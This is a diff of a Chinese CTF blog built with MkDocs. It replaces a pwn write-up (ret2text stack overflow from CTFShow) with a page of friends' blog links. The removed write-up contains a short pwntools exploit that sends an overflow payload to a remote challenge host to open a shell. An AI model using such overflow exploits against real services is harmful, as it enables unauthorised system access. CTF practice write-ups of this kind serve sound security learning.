@@ -14,7 +14,7 @@
     
     
       
-        <title>Pwn_CTFShow_02 - Trick</title>
+        <title>友情链接 - Trick</title>
       
     
     
@@ -61,7 +61,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#101ret2text" class="md-skip">
+        <a href="#_1" class="md-skip">
           跳转至
         </a>
       
@@ -91,7 +91,7 @@
           </span>
           <span class="md-header-nav__topic md-ellipsis">
             
-              Pwn_CTFShow_02
+              友情链接
             
           </span>
         </div>
@@ -261,12 +261,10 @@
       
       
 
-  
 
-
-  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+  <li class="md-nav__item md-nav__item--nested">
     
-      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3" checked>
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
     
     <label class="md-nav__link" for="nav-3">
       writeUp
@@ -308,45 +306,11 @@
           
           
 
-  
 
-
-  <li class="md-nav__item md-nav__item--active">
-    
-    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
-    
-    
-      <label class="md-nav__link md-nav__link--active" for="__toc">
-        Pwn_CTFShow_02
-        <span class="md-nav__icon md-icon"></span>
-      </label>
-    
-    <a href="./" class="md-nav__link md-nav__link--active">
+  <li class="md-nav__item">
+    <a href="../Pwn_CTFShow_02/" class="md-nav__link">
       Pwn_CTFShow_02
     </a>
-    
-      
-<nav class="md-nav md-nav--secondary" aria-label="目录">
-  
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      目录
-    </label>
-    <ul class="md-nav__list" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#101ret2text" class="md-nav__link">
-    1.01栈溢出之ret2text
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-    
   </li>
 
         
@@ -395,11 +359,20 @@
       
       
 
+  
 
-  <li class="md-nav__item">
-    <a href="../friend/" class="md-nav__link">
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+    <a href="./" class="md-nav__link md-nav__link--active">
       友情链接
     </a>
+    
   </li>
 
     
@@ -429,21 +402,8 @@
 <nav class="md-nav md-nav--secondary" aria-label="目录">
   
   
+    
   
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      目录
-    </label>
-    <ul class="md-nav__list" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#101ret2text" class="md-nav__link">
-    1.01栈溢出之ret2text
-  </a>
-  
-</li>
-      
-    </ul>
   
 </nav>
                   </div>
@@ -456,37 +416,13 @@
               
                 
                 
-                  <h1>Pwn_CTFShow_02</h1>
-                
-                <h2 id="101ret2text">1.01栈溢出之ret2text</h2>
-<p>很简单的一个栈溢出
-直接IDA分析</p>
-<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201012194826370.png#pic_center" /></p>
-<p>从main函数跟进到welcome函数
-get() 很明显的溢出</p>
-<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201012194915979.png#pic_center" /></p>
-<pre><code class="language-python">payload = 'a'*(0x80+8)
-</code></pre>
-<p>因为是64位的，所以后面要加上8
-Shift+F12 </p>
-<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201012195035341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" /></p>
-<p>发现/bin/sh 果然够简单的。。。
-双击进去</p>
-<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201012195145849.png#pic_center" /></p>
-<p>再双击</p>
-<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201012195243513.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" /></p>
-<p>找到地址
-exp：</p>
-<pre><code class="language-python">from pwn import *
-
-p=remote('111.231.70.44',28072)
-
-payload='a'*(0x80+8) + p64(0x40063B)
-
-p.sendline(payload)
-
-p.interactive()
-</code></pre>
+                <h1 id="_1">友情链接</h1>
+<p>王神博客 <a href="https://blog.frieggs.com">https://blog.frieggs.com/</a></p>
+<p>戴神博客 <a href="https://m0nit0r.top">https://m0nit0r.top/</a></p>
+<p>杜🐔神博客 <a href="https://blog.dkkkkk.com/">https://blog.dkkkkk.com/</a></p>
+<p>hkx博客 <a href="http://blog.hkk.ink/">http://blog.hkk.ink/</a></p>
+<p>戈挂件博客 <a href="http://err0r.top">http://err0r.top/</a></p>
+<p>cy博客 <a href="http://cy-tian.vip/">http://cy-tian.vip/</a></p>
                 
               
               
@@ -505,7 +441,7 @@ p.interactive()
     <div class="md-footer-nav">
       <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
         
-          <a href="../Pwn_CTFShow_01/" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+          <a href="../%E6%B9%96%E6%B9%98%E6%9D%AFhxb_pwn/" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
             <div class="md-footer-nav__button md-icon">
               <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
             </div>
@@ -514,19 +450,19 @@ p.interactive()
                 <span class="md-footer-nav__direction">
                   上一页
                 </span>
-                Pwn_CTFShow_01
+                湖湘杯hxb_pwn
               </div>
             </div>
           </a>
         
         
-          <a href="../Pwn_0xGame_01/" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
+          <a href="../aboutMkdocs/" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
             <div class="md-footer-nav__title">
               <div class="md-ellipsis">
                 <span class="md-footer-nav__direction">
                   下一页
                 </span>
-                Pwn_0xGame_01
+                MkDocs
               </div>
             </div>
             <div class="md-footer-nav__button md-icon">
